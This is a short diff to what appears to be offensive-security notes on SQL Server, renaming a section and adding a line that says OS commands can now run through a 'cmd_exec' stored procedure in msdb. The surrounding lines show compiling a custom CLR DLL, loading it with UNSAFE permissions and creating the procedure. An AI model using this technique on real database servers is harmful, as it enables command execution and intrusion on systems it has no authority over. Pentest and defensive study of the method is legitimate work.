@@ -1,4 +1,4 @@
-### MSSQL Custom Assemblies
+### Custom CLR DLL for SQL Server
 
 We can compile the `CreateAssembly.cs` file with csc.exe:
 - `csc.exe /target:library cmd_exec.cs`
@@ -24,3 +24,7 @@ WITH PERMISSION_SET = UNSAFE;
 CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];
 GO
 ```
+
+Now you should be able to execute OS commands via the “cmd_exec” stored procedure in the “msdb” database as shown in the example below:
+
+<img width="540" alt="{6011A196-9EFE-4CFA-A551-FDD505DF9E59}" src="https://github.com/user-attachments/assets/be2976cc-7965-4279-a55d-c4d552e86d26" />
